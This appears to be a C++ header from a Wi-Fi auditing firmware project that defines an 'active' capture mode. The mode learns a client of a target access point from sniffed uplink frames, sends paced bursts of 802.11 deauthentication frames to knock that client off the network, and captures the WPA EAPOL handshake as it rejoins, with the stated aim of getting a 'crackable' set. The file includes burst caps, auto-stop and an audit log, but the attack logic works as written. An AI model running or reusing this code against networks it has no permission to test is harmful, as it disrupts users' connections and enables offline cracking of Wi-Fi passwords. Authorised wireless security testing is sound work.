// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
#pragma once

#include <atomic>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

#include "deauth_frame.h"
#include "eapol_mode.h"

namespace airrounds {
namespace active {

// The active capture mode (wire ID 02), in the opt-in active build only. It transmits a bounded
// deauthentication burst at one client of the target access point, then captures the EAPOL
// handshake the rejoin produces. It composes the passive EapolMode for the capture and the
// frame-type contract, and adds the target discovery and the burst. See
// docs/capture-modes-design.md, "Active EAPOL mode".
//
// onFrame runs in the Wi-Fi receive callback under the visit's receive lock; poll runs on the UART
// task with no lock. The two share only the latched target and the handshake flag, published
// through std::atomic, so poll never reads a half-written client address and transmit never runs
// under the lock. The target client is latched once and never mutated after its flag is set.
class ActiveEapolMode final : public session::CaptureMode {
public:
    static constexpr uint8_t burstFrames = 3;          // Deauthentication frames per burst.
    static constexpr uint8_t maxBursts = 2;            // One burst, then one retry if no handshake.
    static constexpr uint64_t interFrameUs = 100000;   // 100 ms between frames in a burst.
    static constexpr uint64_t reBurstWaitUs = 5000000; // 5 s before the retry burst.

    session::CaptureModeId id() const override { return session::CaptureModeId::active; }
    session::RadioNeeds needs() const override { return eapol_.needs(); }

    void reset() override {
        eapol_.reset();
        resetActive();
    }

    bool begin(const session::Target& target, uint64_t budgetUs) override {
        target_ = target;
        resetActive();
        return eapol_.begin(target, budgetUs);
    }

    // In the receive callback, under the receive lock. Learns the target client from an uplink data
    // frame, then delegates the capture. Any accepted EAPOL-Key stops the transmit.
    bool onFrame(const uint8_t* frame, size_t size, uint8_t channel, uint64_t elapsedUs) override {
        if (!targetReady_.load(std::memory_order_relaxed)) {
            learnClient(frame, size, channel);
        }
        const bool accepted = eapol_.onFrame(frame, size, channel, elapsedUs);
        if (accepted) {
            handshakeSeen_.store(true, std::memory_order_release);
        }
        return accepted;
    }

    bool done(uint64_t elapsedUs) const override {
        return eapol_.done(elapsedUs) || eapol_.hasCrackableSet();
    }

    session::ModeResult finish() override { return eapol_.finish(); }

    // On the UART task, no lock. Sends the bounded deauthentication burst at the latched client,
    // but never once a handshake is captured (capture-before-transmit and auto-stop both ride this
    // check) and never beyond the burst count. transmit is capped by the shared round budget.
    void poll(uint64_t nowUs, session::ModeContext& context) override {
        if (!targetReady_.load(std::memory_order_acquire) ||
            handshakeSeen_.load(std::memory_order_acquire) || burstsSent_ >= maxBursts) {
            return;
        }
        if (framesThisBurst_ == 0) {
            if (burstsSent_ > 0 && nowUs < nextBurstUs_) {
                return; // Wait the retry gap before a second burst.
            }
        } else if (nowUs < lastFrameUs_ + interFrameUs) {
            return; // Pace the frames within a burst.
        }
        uint8_t frame[deauthFrameSize];
        const size_t len = buildDeauthFrame(frame, sizeof(frame), targetClient_, target_.bssid,
                                            deauthReasonClass3);
        if (len == 0) {
            return;
        }
        if (context.transmit(frame, len)) {
            ++sentFrames_;
        }
        lastFrameUs_ = nowUs;
        ++framesThisBurst_;
        if (framesThisBurst_ >= burstFrames) {
            ++burstsSent_;
            framesThisBurst_ = 0;
            nextBurstUs_ = nowUs + reBurstWaitUs;
        }
    }

    size_t recordCount() const override { return eapol_.recordCount(); }
    storage::PcapRecord record(size_t index) const override { return eapol_.record(index); }

    bool hasTarget() const { return targetReady_.load(std::memory_order_acquire); }
    const uint8_t* targetClient() const { return targetClient_; }

    // The journal transmit audit (overrides CaptureMode). The reason and the target describe a
    // transmit, so they report nothing until a frame has gone out. A visit that latched a client
    // but captured the handshake before transmitting records no client and no reason.
    uint32_t transmittedFrames() const override { return sentFrames_; }
    uint16_t transmitReason() const override { return sentFrames_ > 0 ? deauthReasonClass3 : 0; }
    const uint8_t* transmitTarget() const override {
        return sentFrames_ > 0 ? targetClient_ : nullptr;
    }

private:
    void resetActive() {
        targetReady_.store(false, std::memory_order_release);
        handshakeSeen_.store(false, std::memory_order_release);
        memset(targetClient_, 0, sizeof(targetClient_));
        burstsSent_ = 0;
        framesThisBurst_ = 0;
        lastFrameUs_ = 0;
        nextBurstUs_ = 0;
        sentFrames_ = 0;
    }

    // Latch the target from an uplink data frame for the target access point: ToDS set, FromDS
    // clear, so Address 1 is the BSSID and Address 2 is the transmitter, the client. A transmitter
    // address is individual, so the target is never a group address; reject a group, the BSSID
    // itself, or a zero address as a further guard.
    void learnClient(const uint8_t* frame, size_t size, uint8_t channel) {
        if (frame == nullptr || size < session::eapolBaseHeaderLen || channel != target_.channel) {
            return;
        }
        if ((frame[0] & 0x0cU) != 0x08U || (frame[1] & 0x03U) != 0x01U) {
            return; // Not a data frame, or not an uplink (ToDS 1, FromDS 0) frame.
        }
        const uint8_t* bssid = frame + 4;   // Address 1: the BSSID on an uplink frame.
        const uint8_t* client = frame + 10; // Address 2: the transmitter, the client.
        if (memcmp(bssid, target_.bssid, 6) != 0) {
            return;
        }
        if ((client[0] & 0x01U) != 0 || memcmp(client, target_.bssid, 6) == 0) {
            return;
        }
        constexpr uint8_t zero[6] = {0, 0, 0, 0, 0, 0};
        if (memcmp(client, zero, 6) == 0) {
            return;
        }
        memcpy(targetClient_, client, 6);
        targetReady_.store(true, std::memory_order_release);
    }

    session::EapolMode eapol_;
    session::Target target_{};
    uint8_t targetClient_[6]{};
    std::atomic<bool> targetReady_{false};
    std::atomic<bool> handshakeSeen_{false};
    uint8_t burstsSent_ = 0;
    uint8_t framesThisBurst_ = 0;
    uint32_t sentFrames_ = 0;
    uint64_t lastFrameUs_ = 0;
    uint64_t nextBurstUs_ = 0;
};

} // namespace active
} // namespace airrounds
